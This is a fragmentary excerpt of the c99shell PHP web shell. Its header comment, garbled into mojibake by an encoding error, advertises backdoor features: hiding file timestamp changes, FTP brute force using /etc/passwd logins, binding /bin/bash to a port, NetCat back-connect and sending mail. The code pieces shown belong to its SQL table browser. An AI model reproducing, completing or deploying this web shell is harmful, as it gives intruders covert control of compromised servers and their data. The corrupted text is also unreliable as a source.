...
*              Freeware license.
*                ?CCTeaM.
* c99shell - ôréë-elíläcld ÷ldl?www-ádîóçld.
* Âu eîclnl álndërníî ner÷rn?dînëläítt âldnct ír äîerríl?nndríc÷el ddîäóenr:
...
*
* Înîálííînnc:
* + óddrâëlícl ëîerëüíuec c óärëlííuec (ftp, samba) ôréërec/drderec, nîdncdîâer
* çrer÷cârícl ner÷cârícl ôréëîâ c drdîe
* (ddläâîdcnlëüíî ódreîâuârlnn?/drndreîâuârlnn? ÷ldl?tar)
* ddîäâcíónu?dîcne (âîçeîcl?âíóndc ôréëîâ)
* modify-time c access-time ?ôréëîâ íl el?tnn? ddc dlärencdîârícc (äë? îne? ne $filestealth)
* + âudîëílícl ddîcçâîëüíîa?PHP-eîär
* + eîäcdîâuce ärííuo ÷ldl?md5, unix-md5, sha1, crc32, base64
* + áunndu?ëîerëüíu?rírëc?álçîdrníînnc ÎN
* + áunndîl ftp-nerícdîârícl ír n?çec login;login c?/etc/passwd (îáu÷í?ärln äînnód e 1/100 reeróínîâ)
* dînndríc÷íu?âuâî? nîdncdîâer, adóddîâul îdldröcc ír?ÁÄ/nráëcörec, óddrâëlícl ddîölnnrec SQL)
* + nedcdn "ëtácn" include: rânîernc÷lnec culn dldlelííul n älnedcdnîdrec c ânnrâë?ln co ?nnuëec (îdöcrëüíî)
nrecl eîcíî cçelícn?$surl (árçîâr? nnuëer) ere ÷ldl?eîíôcaódröct (ddcíóäcnlëüíî) nre c ÷ldl?cookie "c99sh_surl",
cäln rân?çrdcn?çír÷líc? $set_surl ?cookie "set_surl"
* + âîçeîcíînn?"çrácíäcn? /bin/bash ír îddlälëlííu?dîdn n ddîcçâîëüíue drdîële,
* cëc nälërn?back connect (ddîcçâîäcnn? nlnncdîârícl nîlälílíc?, c âuâî?nn? drdrelndu äë? çrdóner NetCat).
* + âîçeîcíînn?áunndîa?nre?óärëlíc? nedcdnr
* + rânîerncçcdîârír? înddrâer nîîáulíc??íläîdráînero c dîclëríc?o rânîd?(÷ldl?mail())
*
*  Ddcâläl?ärële?íl dîëíu?ndcnîe âîçeîcíînnl?
*
* Îccärleul cçelílíc?:
* ~ Ðrçâcncl sql-elíläcldr
* ~ Äîárâëlícl íläînnrtuco drnrcdlíc?ôréëîâ
*
* ~-~ Dcrcnl îá?ânlo íréälíuo íläîdráînero, clërleuo cçelílíc?o c äîdráînero (ärcl ?nreuo ílçír÷cnlëüíuo!)
?ICQ UIN #656555 ëcáî ÷ldl?drçäl?"feedback", áóäón drnneîndlíu ânl ddläëîclíc? c dîclëríc?.
*
...
foreach ($tbl_struct as $field) {$name = $field["Field"]; echo "t <a href=\"#\" onclick=\"document.c99sh_sqlquery.sql_query.value+='`".$name."`';\"><b>".$name."</b></a><br>";}
echo "</td></tr></table>";
}
}
...
$c = 0;
while ($row = mysql_fetch_array($result)) {$count = mysql_query ("select COUNT(*) FROM ".$row[0]); $count_row = mysql_fetch_array($count); echo "<b>t&nbsp;<a href=\"".$sql_surl."sql_db=".htmlspecialchars($sql_db)."&sql_tbl=".htmlspecialchars($row[0])."\"><b>".htmlspecialchars($row[0])."</b></a> (".$count_row[0].")</br></b>"; mysql_free_result($count); $c++;}
...
echo "<td><center><b>t</b></center></td>";
